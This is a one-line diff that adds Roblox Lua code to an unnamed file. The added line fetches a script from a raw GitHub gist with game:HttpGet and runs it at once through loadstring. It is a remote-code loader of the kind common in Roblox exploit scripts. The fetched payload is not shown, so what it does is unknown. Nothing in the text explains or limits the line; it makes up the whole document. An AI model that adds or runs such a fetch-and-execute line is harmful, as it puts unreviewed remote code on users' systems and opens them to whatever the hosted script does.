@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/paygammy/6741e61a09c8aabe9afd1635da856168/raw"))()
